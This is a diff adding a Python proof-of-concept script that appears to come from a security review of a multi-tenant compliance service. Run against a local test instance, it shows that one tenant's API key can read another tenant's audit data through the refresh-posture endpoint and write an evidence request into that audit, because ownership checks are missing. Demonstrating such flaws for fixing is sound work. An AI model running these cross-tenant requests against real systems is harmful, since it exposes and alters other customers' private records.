+"""PROOF 2: refresh-posture reads another tenant's audit; create_request writes to it."""
+import os, sys
+sys.path.insert(0, "/tmp/complens")
+os.environ.update({"APP_ENV":"test","ENABLE_SCHEDULER":"false","EVIDENCE_SIGNING_KEY":"k",
+    "DATABASE_URL":"sqlite+pysqlite:////tmp/p2.db",
+    # Two tenant-scoped keys. Neither is an admin.
+    "COMP_LENS_API_KEYS":"keyA:acme ; keyB:globex"})
+if os.path.exists("/tmp/p2.db"): os.remove("/tmp/p2.db")
+from fastapi.testclient import TestClient
+from app.main import app
+A={"X-API-Key":"keyA"}; B={"X-API-Key":"keyB"}
+
+with TestClient(app) as c:
+    # Tenant globex creates a private audit.
+    b_audit = c.post("/audits?tenant_id=globex", headers=B,
+                     json={"name":"GLOBEX SOC2 2026","framework":"SOC2"}).json()
+    bid = b_audit["id"]
+    print("globex audit id      :", bid, "| controls:", b_audit["controls_total"])
+
+    # Sanity: acme cannot read it the normal way.
+    r = c.get(f"/audits/{bid}?tenant_id=globex", headers=A)
+    print("acme GET globex audit:", r.status_code, "(correctly blocked)")
+    r = c.get(f"/audits/{bid}/controls?tenant_id=acme", headers=A)
+    print("acme list controls   :", r.status_code, r.json(), "(correctly empty)")
+
+    # But refresh-posture takes audit_id straight to the DB with no ownership check.
+    r = c.post(f"/audits/{bid}/refresh-posture?tenant_id=acme", headers=A)
+    print()
+    print(">>> acme POST refresh-posture on GLOBEX's audit id:", r.status_code, r.json())
+    print(">>> leaked globex's control count to acme?         ",
+          r.json().get("controls") == b_audit["controls_total"])
+
+    # And create_request never checks the audit belongs to the caller.
+    r = c.post(f"/audits/{bid}/requests?tenant_id=acme", headers=A,
+               json={"title":"acme-injected PBC item","control_id":"AC-2"})
+    print(">>> acme attached an evidence request to globex's audit:", r.status_code)
+    print("    row id:", r.json().get("id"))
